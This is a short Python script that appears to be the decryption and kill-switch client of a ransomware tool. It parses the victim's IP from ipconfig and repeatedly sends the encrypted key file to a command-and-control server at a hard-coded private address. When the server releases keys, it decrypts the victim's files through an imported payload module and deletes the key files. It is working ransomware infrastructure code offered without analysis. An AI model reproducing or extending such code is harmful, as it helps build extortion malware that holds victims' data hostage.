import requests,time
import os,subprocess,re
import decryption_payload_win as windows

cmd = "ipconfig"
cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
temp = re.findall('IPv4 Address.+: (.+)',cmd.stdout.read().decode())
ip = temp[len(temp)-1].rstrip()
while(True):
    try:
        cipher_text = open('res/key.txt.y4h','rb').read()
        cipher = cipher_text.decode()
        del cipher_text
        res = requests.get('http://172.16.0.6:5000/killswitch/'+ip+'/'+cipher)
        res = res.json()
    except:
        time.sleep(5)
        continue
    if(res['status'] == 'Fuck off'):
        time.sleep(5)
        continue
    else:
        open('res/key.txt','w').write(res['keys'])
        os.remove('res/key.txt.y4h')
        windows.decrypt_win()
        os.remove('res/key.txt')
        break
